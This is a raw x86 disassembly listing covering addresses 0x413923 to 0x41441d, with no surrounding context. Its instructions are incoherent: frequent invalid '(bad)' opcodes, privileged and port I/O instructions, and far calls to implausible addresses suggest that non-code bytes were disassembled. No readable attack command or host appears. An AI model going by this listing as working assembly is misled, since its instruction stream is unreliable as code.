  413923:	pop    ebx
  413924:	dec    edi
  413925:	(bad)  
  413926:	xchg   edx,eax
  413927:	aas    
  413928:	pop    edi
  413929:	sbb    DWORD PTR [esi],ecx
  41392b:	inc    ebx
  41392c:	sub    eax,0xe3320940
  413931:	ret    
  413932:	lea    edx,[esi-0x31]
  413935:	add    edi,DWORD PTR [esi]
  413937:	inc    edx
  413938:	jle    0x4138c9
  41393a:	push   0x63
  41393c:	aas    
  41393d:	mov    al,0x79
  41393f:	xor    ch,BYTE PTR [edi]
  413941:	(bad)
  413945:	sbb    edx,ebp
  413947:	xor    DWORD PTR [ebp-0x47a92605],edx
  41394d:	mov    cs,eax
  41394f:	xor    DWORD PTR [ebp-0x64b82661],edx
  413955:	mov    ?,WORD PTR [eax-0x666c8acf]
  41395b:	fisub  WORD PTR [edx+0x8e]
	...
  413985:	add    BYTE PTR [eax],al
  413987:	add    BYTE PTR [eax-0x4b686b1b],ch
  41398d:	dec    esp
  41398e:	out    0x18,al
  413990:	xchg   edx,eax
  413991:	xor    DWORD PTR [edx],edi
  413993:	cld    
  413994:	nop
  413995:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413996:	rcr    DWORD PTR [ebx-0x71317279],cl
  41399c:	jbe    0x4139ba
  41399e:	hlt    
  41399f:	add    edx,DWORD PTR [ebx]
  4139a1:	out    0xcb,al
  4139a3:	mov    gs,edx
  4139a5:	pop    esi
  4139a6:	mov    edi,0xaf320642
  4139ab:	cli    
  4139ac:	mov    eax,ds:0x411bd0a6
  4139b1:	mov    ecx,0x42ee0428
  4139b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4139b7:	ss dec ecx
  4139b9:	xor    DWORD PTR [eax],edi
  4139bb:	sbb    al,0x8c
  4139bd:	sbb    eax,0x5ba60428
  4139c2:	out    0x9e,eax
  4139c4:	repz ret 
  4139c6:	add    ah,dl
  4139c8:	arpl   WORD PTR [edx-0x584ee700],bx
  4139ce:	or     BYTE PTR [ecx+0x17],dl
  4139d1:	mov    dh,0xfd
  4139d3:	pop    esi
  4139d4:	mov    ch,0xee
  4139d6:	push   ecx
  4139d7:	push   esi
  4139d8:	mov    eax,0xa5dd7431
  4139dd:	pop    esi
  4139de:	pop    eax
  4139df:	inc    esi
  4139e0:	enter  0xc065,0xb5
  4139e4:	adc    bh,BYTE PTR [ecx+0x5b82cf0e]
  4139ea:	push   eax
  4139eb:	inc    ecx
	...
  413a14:	add    BYTE PTR [eax],al
  413a16:	push   edi
  413a17:	mov    ebp,edi
  413a19:	es or  eax,0x7d2ab2c3
  413a1f:	pop    ebx
  413a20:	push   0xbf403de9
  413a25:	or     esi,0x6de93fb6
  413a2b:	xor    BYTE PTR [ecx+esi*8-0x2b],dh
  413a2f:	pop    es
  413a30:	jnp    0x413a28
  413a32:	mov    ebx,0xb09a8838
  413a37:	xor    eax,ecx
  413a39:	stos   DWORD PTR es:[edi],eax
  413a3a:	call   0xc4dd:0xde725530
  413a41:	aad    0x24
  413a43:	pop    ebx
  413a44:	push   0xd
  413a46:	mov    bl,0xa7
  413a48:	or     cl,dl
  413a4a:	pop    ss
  413a4b:	mov    al,ds:0x96f5befd
  413a50:	cld    
  413a51:	inc    ebx
  413a52:	push   esp
  413a53:	xor    DWORD PTR [ecx+eiz*8-0x3b],esi
  413a57:	sar    ch,0xa6
  413a5a:	retf   
  413a5b:	ret    0x9e21
  413a5e:	sub    DWORD PTR [ebx-0x18],esp
  413a61:	btc    DWORD PTR [ecx],esi
  413a64:	inc    BYTE PTR [ebx]
  413a66:	dec    esi
  413a67:	xor    DWORD PTR [eax+eax*1+0x2f],esi
  413a6b:	aam    0x59
  413a6d:	push   DWORD PTR [eax-0x4c8a0122]
  413a73:	fidiv  WORD PTR [eax+ecx*1-0x41]
  413a77:	pop    ss
  413a78:	dec    esi
  413a79:	inc    DWORD PTR [eax]
	...
  413aa3:	add    BYTE PTR [eax+0x2704bff4],ah
  413aa9:	imul   ecx,DWORD PTR [ecx+0xc4870ec],0xfd6687e8
  413ab3:	(bad)  
  413ab4:	in     al,dx
  413ab5:	sbb    esi,DWORD PTR [edx+0x24]
  413ab8:	invd   
  413aba:	fs inc ecx
  413abc:	xlat   BYTE PTR ds:[ebx]
  413abd:	imul   ebp,eax,0x1c
  413ac0:	enter  0xfede,0x50
  413ac4:	scas   eax,DWORD PTR es:[edi]
  413ac5:	pop    ebx
  413ac6:	add    bh,ch
  413ac8:	jno    0x413b19
  413aca:	inc    ebp
  413acb:	xchg   si,ax
  413acd:	pop    ebx
  413ace:	push   eax
  413acf:	jmp    FWORD PTR [edx-0x3cf819cd]
  413ad5:	fdivp  st(6),st
  413ad7:	call   0x3ea573
  413adc:	pop    esi
  413add:	sbb    eax,0xb2ca0006
  413ae2:	jmp    0x6821266a
  413ae7:	add    ch,ch
  413ae9:	pop    ds
  413aea:	push   DWORD PTR [ebp-0x61]
  413aed:	shr    DWORD PTR [edi],cl
  413aef:	push   eax
  413af0:	jo     0x413ad0
  413af2:	mov    BYTE PTR [ebp-0x7d],al
  413af5:	push   ecx
  413af6:	sbb    bh,bh
  413af8:	sub    ch,BYTE PTR [edi]
  413afa:	out    0xaa,al
  413afc:	mov    al,0xde
  413afe:	(bad)  
  413aff:	push   0x34
  413b01:	fidiv  WORD PTR [eax+ecx*1-0x51]
  413b05:	mov    ebx,0xfffe
	...
  413b32:	mov    al,0x51
  413b34:	sbb    al,0xff
  413b36:	ds dec edi
  413b38:	cld    
  413b39:	out    0xa8,eax
  413b3b:	loopne 0x413ac9
  413b3d:	(bad)  
  413b3e:	cmp    DWORD PTR [eax],esi
  413b40:	mov    ?,esi
  413b42:	stos   DWORD PTR es:[edi],eax
  413b43:	sub    al,0x9a
  413b45:	dec    ebx
  413b46:	mov    fs,WORD PTR [ebp+0x38fcc88c]
  413b4c:	add    dl,BYTE PTR [ebp-0x3b]
  413b4f:	mov    BYTE PTR [eax+0x17e616c3],al
  413b55:	add    BYTE PTR [esi+eax*2-0x63c98b75],dl
  413b5c:	pushf  
  413b5d:	dec    esi
  413b5e:	stc    
  413b5f:	xchg   ebp,eax
  413b60:	jp     0x413ba6
  413b62:	repnz test eax,0x37646ce
  413b68:	add    al,BYTE PTR [eax+0x47164421]
  413b6e:	in     ax,0x23
  413b71:	inc    ecx
  413b72:	ds in  eax,0x99
  413b75:	adc    DWORD PTR [ecx],ecx
  413b77:	inc    esp
  413b78:	add    cl,BYTE PTR [ebx]
  413b7a:	dec    al
  413b7c:	xlat   BYTE PTR ds:[ebx]
  413b7d:	push   esi
  413b7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b7f:	fisubr WORD PTR ds:0xc229b1ff
  413b85:	jae    0x413be5
  413b87:	mov    ebx,0x4416f846
  413b8c:	add    ch,bh
  413b8e:	fmul   DWORD PTR [esp+ebp*1-0x74bc009a]
  413b95:	je     0x413b97
	...
  413bbf:	add    BYTE PTR [esi-0x69f7effb],al
  413bc5:	call   0xf810:0x1579ff0d
  413bcc:	data16 je 0x413c05
  413bcf:	jmp    FWORD PTR [ecx-0x18]
  413bd2:	aad    0xbf
  413bd4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413bd5:	std    
  413bd6:	mov    esi,edi
  413bd8:	pop    ecx
  413bd9:	pop    ebx
  413bda:	cdq    
  413bdb:	pop    edx
  413bdc:	or     DWORD PTR [esi+0x14],edx
  413bdf:	dec    ebp
  413be0:	dec    eax
  413be1:	test   al,0x93
  413be3:	mov    ecx,edx
  413be5:	bound  edi,QWORD PTR [edi-0x4f]
  413be8:	mov    BYTE PTR [esi],ch
  413bea:	xchg   DWORD PTR [ebx],ebp
  413bec:	pop    es
  413bed:	sbb    esp,esp
  413bef:	add    edx,DWORD PTR [ebx-0x2787c1e]
  413bf5:	ss pop ss
  413bf7:	push   ds
  413bf8:	shl    DWORD PTR ds:[esi],0x8b
  413bfc:	mov    ah,BYTE PTR [ebx+0x4f]
  413bff:	adc    edi,DWORD PTR [ecx+0x2e]
  413c02:	push   edi
  413c03:	jge    0x413c7f
  413c05:	das    
  413c06:	arpl   cx,cx
  413c08:	and    BYTE PTR [ebx+0x6dbe03a8],0xe7
  413c0f:	jno    0x7f62d0d8
  413c15:	pop    ebx
  413c16:	xchg   esi,eax
  413c17:	fwait
  413c18:	mov    bh,0x6c
  413c1a:	out    0x3,eax
  413c1c:	inc    ebp
  413c1d:	sbb    edx,DWORD PTR [ebp+ebx*8+0x2f064370]
	...
  413c4c:	add    BYTE PTR [eax],al
  413c4e:	shr    DWORD PTR ds:0x7b2dc3e3,0x70
  413c55:	inc    ecx
  413c56:	mov    dh,0xc2
  413c58:	out    0x3,eax
  413c5a:	cdq    
  413c5b:	in     al,dx
  413c5c:	jg     0x413c7f
  413c5e:	sbb    BYTE PTR [edi+eiz*8-0x18cced76],bl
  413c65:	adc    BYTE PTR [esi+0x43],al
  413c68:	fimul  DWORD PTR ds:0x10d72d89
  413c6e:	xchg   BYTE PTR [edx-0x30],al
  413c71:	xor    al,0x79
  413c73:	sub    eax,0xf3b1d6c4
  413c78:	mov    esi,0x12d688a
  413c7d:	mov    ebx,0x34056607
  413c82:	or     esi,DWORD PTR [esi-0x104b1700]
  413c88:	push   0x9c1c07
  413c8d:	add    ebp,esi
  413c8f:	mov    bh,0x3f
  413c91:	jmp    0x9149e45a
  413c96:	sub    eax,0x4b7efdb2
  413c9b:	pop    ebx
  413c9c:	push   0x9a5c06
  413ca1:	add    DWORD PTR [eax-0x3b16c04a],ebp
  413ca7:	shl    DWORD PTR [bx+di+0x5b82],0xe8
  413cad:	cmp    eax,0x60fe2c51
	...
  413cda:	add    BYTE PTR [eax],al
  413cdc:	jle    0x413d1d
  413cde:	imul   ebp,ecx,0x55
  413ce1:	scas   eax,DWORD PTR es:[edi]
  413ce2:	data16 test al,0x3d
  413ce5:	ret    
  413ce6:	call   0xf4:0xfd5b7acf
  413ced:	xchg   ebp,eax
  413cee:	aas    
  413cef:	jmp    0x1e962fa9
  413cf4:	mov    ah,0xe3
  413cf6:	inc    ebx
  413cf7:	sbb    eax,0x61685b23
  413cfc:	pop    edi
  413cfd:	call   0xe93f:0xb6239100
  413d04:	mov    ah,0x67
  413d06:	shl    DWORD PTR [ecx+0x49e85afa],0x69
  413d0d:	sub    al,0xfe
  413d0f:	jo     0x413d62
  413d11:	sub    ecx,DWORD PTR [esp+0x78689cde]
  413d18:	pop    esp
  413d19:	call   0x3f:0xb5e84100
  413d20:	jcxz   0x413d57
  413d23:	ret    
  413d24:	das    
  413d25:	cwde   
  413d26:	add    al,ch
  413d28:	shr    DWORD PTR [edx-0x3],cl
  413d2b:	(bad)  
  413d2c:	fisubr WORD PTR [ebx-0x18]
  413d2f:	sbb    DWORD PTR [edx],0xffffffcb
  413d32:	std    
  413d33:	jae    0x413d44
  413d35:	(bad)  
  413d36:	jl     0x413d28
  413d38:	push   edi
  413d39:	pop    esp
  413d3a:	inc    edx
  413d3b:	or     DWORD PTR [edx-0x2d],0xfffffffd
  413d3f:	jae    0x413d41
	...
  413d69:	add    bl,bh
  413d6b:	dec    edi
  413d6c:	(bad)  
  413d6d:	(bad)  
  413d6e:	mov    eax,0x1f75fea0
  413d73:	sar    dl,1
  413d75:	dec    ebp
  413d76:	test   al,0xe2
  413d78:	(bad)  
  413d79:	jne    0x413dee
  413d7b:	loop   0x413df1
  413d7d:	or     BYTE PTR [edi+0x65],ch
  413d80:	dec    esi
  413d81:	jmp    FWORD PTR [eax-0x1e]
  413d84:	je     0x413d76
  413d86:	mov    BYTE PTR [eax+ecx*1-0x18],bl
  413d8a:	mov    al,ds:0x28fffd71
  413d8f:	pop    esp
  413d90:	in     al,dx
  413d91:	jmp    DWORD PTR [edx-0x46c319d1]
  413d97:	loop   0x413d97
  413d99:	push   DWORD PTR [edx+0x2f75fecb]
  413d9f:	loop   0x413e15
  413da1:	or     BYTE PTR [edi],bh
  413da3:	push   ebp
  413da4:	dec    esi
  413da5:	dec    DWORD PTR [eax-0x1e]
  413da8:	je     0x413d96
  413daa:	dec    edi
  413dab:	es push ecx
  413dad:	jmp    FWORD PTR [eax+0x3ff474e2]
  413db3:	cs push ecx
  413db5:	jmp    FWORD PTR [eax+0x6ff074e2]
  413dbb:	push   esi
  413dbc:	dec    edi
  413dbd:	jmp    FWORD PTR [eax-0x1e]
  413dc0:	je     0x413daa
  413dc2:	sbb    cl,BYTE PTR ds:[ebp-0x76e386b1]
  413dc9:	je     0x413e3d
  413dcb:	adc    al,0xf
  413dcd:	or     BYTE PTR [eax],al
	...
  413df7:	add    BYTE PTR [esi-0x65],dl
  413dfa:	cmp    bh,bh
  413dfc:	popa   
  413dfd:	inc    esp
  413dfe:	mov    ecx,0x2f4242c1
  413e03:	mov    esp,DWORD PTR [edx-0x40]
  413e06:	mov    ebp,0x1c41d4fb
  413e0b:	inc    eax
  413e0c:	inc    ecx
  413e0d:	dec    esi
  413e0e:	cld    
  413e0f:	out    0x4f,eax
  413e11:	dec    edx
  413e12:	xchg   esi,edi
  413e14:	(bad)  
  413e15:	ja     0x413d9f
  413e17:	imul   edi,DWORD PTR [esi],0xf068044e
  413e1d:	pop    edx
  413e1e:	inc    ecx
  413e1f:	add    BYTE PTR [esi-0x41fffdcc],ah
  413e25:	mov    WORD PTR [edx+edx*2-0x400375f7],gs
  413e2c:	mov    dl,BYTE PTR [ebp+0x34]
  413e2f:	call   0xfeca2cf9
  413e34:	inc    ebp
  413e35:	je     0x413e44
  413e37:	sbb    DWORD PTR [esi-0x2efffdf4],ecx
  413e3d:	mov    dl,0x19
  413e3f:	leave  
  413e40:	pusha  
  413e41:	repz add DWORD PTR [eax-0x2f],edx
  413e45:	(bad)  
  413e46:	stc    
  413e47:	out    0xad,eax
  413e49:	sti    
  413e4a:	mov    dh,bh
  413e4c:	(bad)  
  413e4d:	mov    al,0x31
  413e4f:	(bad)  
  413e50:	mov    ecx,0xb1fc0e59
  413e55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413e56:	stc    
  413e57:	out    0x39,eax
  413e59:	cli    
  413e5a:	mov    dh,bh
	...
  413e84:	add    BYTE PTR [eax],al
  413e86:	ja     0x413efe
  413e88:	std    
  413e89:	push   edx
  413e8b:	mov    esp,0x5b7a8295
  413e90:	jecxz  0x413ec1
  413e92:	adc    al,0x5b
  413e94:	push   ecx
  413e95:	inc    ebp
  413e96:	xor    DWORD PTR [eax-0x67506421],0xa0c687ce
  413ea0:	ret    
  413ea1:	jnp    0x413ecd
  413ea3:	mov    ds:0xdb3e452f,al
  413ea8:	test   BYTE PTR [ebx],0xd2
  413eab:	call   0x2ee7:0x9bdb983f
  413eb2:	push   esi
  413eb3:	adc    ah,bl
  413eb5:	add    edi,DWORD PTR [esi]
  413eb7:	push   esi
  413eb8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413eb9:	adc    BYTE PTR [ebp-0x6e],bl
  413ebc:	jg     0x413e9b
  413ebe:	xchg   edi,eax
  413ebf:	sub    al,BYTE PTR [edi-0x1f511605]
  413ec5:	xor    edx,DWORD PTR [esi-0x246918a5]
  413ecb:	mov    dl,0x79
  413ecd:	push   ds
  413ece:	jg     0x413f2b
  413ed0:	mov    bh,0x86
  413ed2:	xchg   edx,eax
  413ed3:	push   ebx
  413ed4:	dec    edi
  413ed5:	aad    0x86
  413ed7:	sub    dl,BYTE PTR [edi-0x64]
  413eda:	aaa    
  413edb:	mov    ecx,DWORD PTR [esi-0x79]
  413ede:	cmc    
  413edf:	ins    DWORD PTR es:[edi],dx
  413ee0:	daa    
  413ee1:	dec    ebp
  413ee2:	call   0xefc87e10
  413ee7:	clc    
  413ee8:	out    dx,eax
  413ee9:	inc    BYTE PTR [eax]
	...
  413f13:	add    BYTE PTR [edx+0x1b],dl
  413f16:	das    
  413f17:	adc    edx,edx
  413f19:	sub    DWORD PTR [ebp-0x53361e05],ebx
  413f1f:	xchg   al,al
  413f21:	mov    DWORD PTR [eax],esp
  413f23:	ret    0x5b3d
  413f26:	mov    ah,0x7a
  413f28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f29:	(bad)  [ebx]
  413f2b:	mov    BYTE PTR [eax],dl
  413f2d:	mov    ch,0xe7
  413f2f:	sbb    esp,edi
  413f31:	sub    DWORD PTR [ecx],eax
  413f33:	jl     0x413eca
  413f35:	inc    ecx
  413f36:	inc    eax
  413f37:	pushf  
  413f38:	mov    eax,0xb62c8828
  413f3d:	aam    0x3b
  413f3f:	es inc edx
  413f41:	pushf  
  413f42:	add    BYTE PTR [ecx-0x80],ch
  413f45:	sub    DWORD PTR [edx+0x29],esi
  413f48:	push   edx
  413f49:	pop    ebp
  413f4a:	sub    BYTE PTR gs:[edx-0x6e],al
  413f4e:	call   0xfe6ab598
  413f53:	loop   0x413fd2
  413f55:	lods   eax,DWORD PTR ds:[esi]
  413f56:	and    DWORD PTR [esi],edx
  413f58:	mov    dl,0xf1
  413f5a:	push   edi
  413f5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f5c:	rcl    BYTE PTR [eax+eax*8+0x15],0x53
  413f61:	cdq    
  413f62:	push   0xbf383de9
  413f67:	add    DWORD PTR [ebx],esi
  413f69:	ret    0xe93f
  413f6c:	ins    DWORD PTR es:[edi],dx
  413f6d:	sub    BYTE PTR [ecx+esi*8-0x3b],dh
  413f71:	call   0x4101b5ee
  413f76:	enter  0x1e,0x0
	...
  413fa2:	mov    ecx,0x21afd29
  413fa7:	in     al,0xfd
  413fa9:	pop    esi
  413faa:	mov    eax,0x587f329
  413faf:	bound  esi,QWORD PTR [ebx+0x29]
  413fb2:	push   edi
  413fb3:	jl     0x413f9d
  413fb5:	cmc    
  413fb6:	sbb    DWORD PTR [eax],ebp
  413fb8:	(bad)  
  413fb9:	repnz std 
  413fbb:	lods   al,BYTE PTR ds:[esi]
  413fbc:	and    al,0xc1
  413fbe:	int3   
  413fbf:	sar    DWORD PTR [edi],0xe9
  413fc2:	or     eax,0xc0ba9933
  413fc7:	sub    DWORD PTR [ecx-0x6f],edx
  413fca:	cmp    eax,0x5557ed5b
  413fcf:	push   edx
  413fd0:	gs test al,0x3d
  413fd3:	mov    edi,ebp
  413fd5:	add    BYTE PTR [edx],ch
  413fd7:	and    al,0xe6
  413fd9:	cmp    DWORD PTR [edi+0x23e8fee1],0x71
  413fe0:	std    
  413fe1:	(bad)  
  413fe2:	mov    ebp,0x44dde63d
  413fe7:	fdivp  st(6),st
  413fe9:	or     edx,edi
  413feb:	dec    ebx
  413fec:	and    al,0x68
  413fee:	ins    BYTE PTR es:[edi],dx
  413fef:	inc    edi
  413ff0:	aas    
  413ff1:	add    BYTE PTR [edi],dh
  413ff3:	(bad)  
  413ff4:	push   0x4dde8053
  413ff9:	push   0xbeed5c57
  413ffe:	jmp    DWORD PTR [ebx]
  414000:	addr16 inc ecx
  414002:	ins    BYTE PTR es:[di],dx
  414004:	std    
  414005:	jne    0x414007
	...
  41402f:	add    BYTE PTR [edi-0x3c],cl
  414032:	push   ecx
  414033:	js     0x413fd5
  414035:	fsubrp st(5),st
  414037:	pop    ebp
  414038:	pusha  
  414039:	fdivp  st(6),st
  41403b:	dec    DWORD PTR [edx-0x2d]
  41403e:	(bad)  
  41403f:	jne    0x414070
  414041:	(bad)  
  414042:	int    0x4c
  414044:	mov    al,ds:0xe5c95ede
  414049:	pop    edx
  41404a:	add    BYTE PTR [ebp-0x64],dl
  41404d:	ret    
  41404e:	add    ah,0x67
  414051:	mov    al,0x44
  414053:	lock (bad) 
  414055:	fidiv  WORD PTR [esp+ecx*1+0x7f]
  414059:	(bad)  
  41405a:	push   ecx
  41405b:	inc    DWORD PTR [eax-0x1a8b41de]
  414061:	fidivr DWORD PTR [esp+edi*8-0x2b]
  414065:	push   ebp
  414066:	and    DWORD PTR [ebx-0x7e9c2c56],ecx
  41406c:	iret   
  41406d:	mov    ebp,cr6
  414070:	fidiv  WORD PTR ds:[eax+edx*1+0x20]
  414075:	pop    eax
  414076:	or     al,ch
  414078:	ds jg  0x4140b2
  41407b:	push   DWORD PTR [ecx-0x5603f2a8]
  414081:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414082:	mov    esi,edi
  414084:	sub    ebp,DWORD PTR [edx]
  414086:	call   0xfb8c:0x853105f4
  41408d:	and    DWORD PTR [edx],esi
  41408f:	call   0xfec4a7df
	...
  4140bc:	add    BYTE PTR [eax],al
  4140be:	ja     0x4140b3
  4140c0:	cmc    
  4140c1:	call   DWORD PTR [edx]
  4140c3:	mov    ebp,0x97a8295
  4140c8:	sbb    BYTE PTR [eax],al
  4140ca:	aam    0x74
  4140cc:	xor    DWORD PTR [esi+esi*1+0xa],0xffffffdd
  4140d1:	dec    ebx
  4140d2:	pop    ecx
  4140d3:	lock jp 0x41411a
  4140d6:	push   edx
  4140d7:	fwait
  4140d8:	add    al,0x6a
  4140da:	ds dec edx
  4140dc:	fldenv [esi-0x1]
  4140df:	xor    DWORD PTR [edx],ebx
  4140e1:	add    bh,BYTE PTR [esi]
  4140e3:	xor    al,0x82
  4140e5:	out    0x2f,eax
  4140e7:	fs cmp esi,0x35
  4140eb:	hlt    
  4140ec:	or     eax,0x8c7fb73f
  4140f1:	addr16 xchg ebx,eax
  4140f3:	push   ebp
  4140f4:	inc    ecx
  4140f5:	add    BYTE PTR [ecx],dl
  4140f7:	xor    BYTE PTR [edx+0x47947e7],cl
  4140fd:	add    BYTE PTR ds:0xf9230d74,dh
  414103:	pop    es
  414104:	mov    ah,bh
  414106:	(bad)
  414109:	dec    BYTE PTR [esi+0x7ec9310c]
  41410f:	xor    al,0x1a
  414111:	add    BYTE PTR [esi],bh
  414113:	popf   
  414114:	inc    ebx
  414115:	imul   edi,DWORD PTR [esi],0x367484c4
  41411b:	pop    ebx
  41411c:	setns  BYTE PTR [edx+0x26]
  414120:	pop    ds
  414121:	fwait
	...
  41414a:	add    BYTE PTR [eax],al
  41414c:	fist   DWORD PTR [ebp-0x4f4f7bea]
  414152:	setnp  bl
  414155:	xchg   ebp,eax
  414156:	push   es
  414157:	test   BYTE PTR [eax+0x1283fbb0],ah
  41415d:	push   ebx
  41415e:	(bad)  
  41415f:	stc    
  414160:	add    eax,0x7fb9ef26
  414165:	pop    edi
  414166:	out    0xd8,eax
  414168:	mov    ah,0x37
  41416a:	imul   ecx,DWORD PTR [eax+0x75],0xffffffb1
  41416e:	out    0xed,eax
  414170:	std    
  414171:	and    eax,0xf8560c55
  414176:	xor    al,BYTE PTR [ebx-0x7fdb2ba0]
  41417c:	loope  0x4141d8
  41417e:	out    0x72,eax
  414180:	xchg   ebx,eax
  414181:	mov    bl,0x5f
  414183:	jmp    0x414183
  414185:	pop    edx
  414186:	vmmcall 
  414189:	fwait
  41418a:	out    0x82,eax
  41418c:	mov    dl,0x53
  41418e:	jg     0x41412c
  414190:	test   al,0x26
  414192:	pop    DWORD PTR [ebx-0x678d84e]
  414198:	cmp    DWORD PTR [ebx],esi
  41419a:	scas   al,BYTE PTR es:[edi]
  41419b:	iret   
  41419c:	sbb    BYTE PTR [esi],ah
  41419e:	mov    eax,ds:0x145b3d46
  4141a3:	(bad)  
  4141a4:	adc    eax,0x997c2bda
  4141a9:	pop    ebx
  4141aa:	out    0x72,eax
  4141ac:	mov    ebx,0xbdd25
	...
  4141d9:	add    dh,ah
  4141db:	xor    BYTE PTR [edx-0x42da177e],ah
  4141e1:	psraw  mm5,QWORD PTR [edi-0x6d819411]
  4141e8:	add    BYTE PTR [esi],dh
  4141ea:	mov    ebp,0xbcd97424
  4141ef:	scas   al,BYTE PTR es:[edi]
  4141f0:	or     BYTE PTR [ecx],dl
  4141f2:	add    al,0x92
  4141f4:	std    
  4141f5:	push   ds
  4141f6:	mov    ebp,0xb71618ae
  4141fb:	dec    ecx
  4141fc:	std    
  4141fd:	xchg   esp,eax
  4141fe:	xor    eax,0xbcb3fd33
  414203:	and    al,0x69
  414205:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  414207:	call   0x6de8:0x5596f600
  41420e:	dec    ebx
  41420f:	pop    ebx
  414210:	add    dl,dh
  414212:	std    
  414213:	scas   al,BYTE PTR es:[edi]
  414214:	arpl   WORD PTR [ecx+0xb],dx
  414217:	mov    ebp,0x15e5e93f
  41421c:	cmp    ecx,ebp
  41421e:	cmp    eax,0x55c143d4
  414223:	adc    ah,BYTE PTR [esi+0x28]
  414226:	inc    edx
  414227:	es je  0x414203
  41422a:	in     eax,0x87
  41422c:	cmp    ch,cl
  41422e:	cmp    eax,0x341dc052
  414233:	pop    edx
  414234:	inc    ebx
  414235:	mov    eax,ds:0x96109fca
  41423a:	ss push ebp
  41423c:	call   0x41430f
	...
  414265:	add    BYTE PTR [eax],al
  414267:	add    BYTE PTR [eax],bl
  414269:	es (bad) 
  41426b:	push   0xffffffa5
  41426d:	and    eax,0x9fcab575
  414272:	cld    
  414273:	add    DWORD PTR [ebx],edi
  414275:	pop    ebx
  414276:	in     eax,dx
  414277:	das    
  414278:	mov    esp,0x95108af
  41427d:	xchg   ebx,eax
  41427e:	std    
  41427f:	pop    esi
  414280:	mov    esp,0xf6560caf
  414285:	pop    esp
  414286:	call   0xfe673dad
  41428b:	add    BYTE PTR [eax+0x23],bh
  41428e:	cli    
  41428f:	call   DWORD PTR [edx-0x62a117b0]
  414295:	fsin   
  414297:	call   DWORD PTR [edx-0x3c8a02c0]
  41429d:	fnstenv [eax+ecx*1+0x4f]
  4142a1:	rol    BYTE PTR [edi-0x1],cl
  4142a4:	dec    eax
  4142a5:	xchg   edi,eax
  4142a6:	mov    edi,0x8b039714
  4142ab:	in     al,dx
  4142ac:	adc    al,0x9c
  4142ae:	cmc    
  4142af:	push   esi
  4142b0:	and    al,0x9b
  4142b2:	addr16 dec ebx
  4142b4:	out    0x58,al
  4142b6:	add    BYTE PTR [ebx+ebx*1-0x23],dh
  4142ba:	cmp    al,0x65
  4142bc:	dec    esp
  4142bd:	sbb    dh,bh
  4142bf:	call   DWORD PTR [ebx]
  4142c1:	cmp    DWORD PTR cs:0x4115ea,0x57
  4142c9:	sub    al,0x68
  4142cb:	mov    DWORD PTR [eax],0x0
	...
  4142f5:	add    BYTE PTR [edx],dl
  4142f7:	(bad)  
  4142f9:	jmp    DWORD PTR [edi+0x58]
  4142fc:	lds    eax,FWORD PTR [ebp-0x71]
  4142ff:	pop    edi
  414300:	add    BYTE PTR [eax],al
  414302:	push   edi
  414303:	aad    0x44
  414305:	cld    
  414306:	pop    es
  414307:	aam    0x44
  414309:	clc    
  41430a:	ja     0x414341
  41430c:	(bad)  
  41430d:	addr16 mov ch,0x32
  414310:	inc    ecx
  414311:	add    BYTE PTR [eax+0x564b634b],bh
  414317:	pop    edi
  414318:	or     eax,eax
  41431a:	adc    ebx,DWORD PTR [edi]
  41431c:	cmp    DWORD PTR [ebp-0x71],0x5f
  414320:	je     0x41435f
  414322:	xchg   esp,eax
  414323:	and    al,0xfa
  414325:	add    bl,ah
  414327:	bound  ecx,QWORD PTR [ecx+0x1bb69b75]
  41432d:	push   esi
  41432e:	ds mov ecx,0x2a70ff3a
  414334:	xor    DWORD PTR [ebp+0x42],0xd907fa9d
  41433b:	jmp    0x41436e
  41433d:	dec    DWORD PTR [ebx+0x3a]
  414340:	push   0xffffffdd
  414342:	enter  0x7f74,0x5d
  414346:	shr    esi,0x79
  414349:	add    BYTE PTR [eax-0x49837ac3],0x31
  414350:	test   BYTE PTR [edi*4-0x768afded],0x5c
  414358:	cmc    
  414359:	sti    
	...
  414382:	add    BYTE PTR [eax],al
  414384:	cdq    
  414385:	push   cs
  414386:	jmp    0x4143d2
  414388:	push   DWORD PTR [ecx]
  41438a:	loopne 0x414354
  41438c:	jl     0x4143cb
  41438e:	add    dl,BYTE PTR [ebp-0x4b]
  414391:	or     eax,0x6072c385
  414396:	inc    edi
  414397:	inc    esp
  414398:	jbe    0x4143cb
  41439a:	add    al,BYTE PTR [eax]
  41439c:	ds std 
  41439e:	(bad)  
  41439f:	repz xor al,BYTE PTR ds:[edx]
  4143a3:	add    BYTE PTR [ecx+0x6e],bl
  4143a6:	adc    al,0x8f
  4143a8:	sti    
  4143a9:	in     eax,dx
  4143aa:	push   edx
  4143ab:	ins    BYTE PTR es:[edi],dx
  4143ac:	dec    edx
  4143ad:	xchg   edi,eax
  4143ae:	add    al,0x6a
  4143b0:	ds dec eax
  4143b2:	add    al,0x6a
  4143b4:	ds shl esi,0xfb
  4143b8:	xor    DWORD PTR [eax+0x10],eax
  4143bb:	push   0x3e
  4143bd:	pop    esi
  4143be:	add    al,0xe8
  4143c0:	inc    ebx
  4143c1:	sbb    al,0x2
  4143c3:	add    BYTE PTR [ebp-0xc],al
  4143c6:	cmc    
  4143c7:	xor    al,0x6e
  4143c9:	inc    esp
  4143ca:	ins    BYTE PTR es:[edi],dx
  4143cb:	loopne 0x414447
  4143cd:	mov    cl,0x80
  4143cf:	mov    BYTE PTR [ebx+0x5b],bh
  4143d2:	pop    edi
  4143d3:	fisub  DWORD PTR [edi+0x5b]
  4143d6:	rol    DWORD PTR [ebx],1
  4143d8:	(bad)  
  4143d9:	and    bl,ch
  4143db:	jnp    0x4143c5
  4143dd:	test   al,0x4b
  4143df:	sub    BYTE PTR [edx+0x4f],0xd1
  4143e3:	add    esp,DWORD PTR [ebx+ebx*2+0x4f]
  4143e7:	js     0x4143e9
	...
  414411:	add    BYTE PTR [eax],cl
  414413:	pop    ebx
  414414:	out    0xc,eax
  414416:	(bad)  
  414417:	test   al,0xde
  414419:	or     BYTE PTR [edx+0x23],0x10
  41441d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
